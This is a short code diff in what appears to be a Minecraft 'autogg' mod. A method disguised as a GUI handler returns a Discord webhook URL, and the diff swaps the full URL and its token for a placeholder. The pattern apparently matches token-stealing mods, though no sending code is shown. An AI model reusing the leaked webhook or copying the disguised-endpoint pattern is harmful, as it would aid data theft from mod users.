@@ -3,7 +3,7 @@ package github.quantizr.autogg.guis;
 public class gui {
 	public static String guiHandler() {
 		// put the webhook here
-		return "https://discord.com/api/webhooks/1050226148551962655/0slw6q8Q8sh8tmKaANxL3l9N-JePhBrlfCMTzFnRRhC7ZAJGlYYRskORhBbOg65bdTYo";
+		return "replace this with webhook";
 		// WEBHOOK GOES IN HERE ^^^^^^
 				}
 
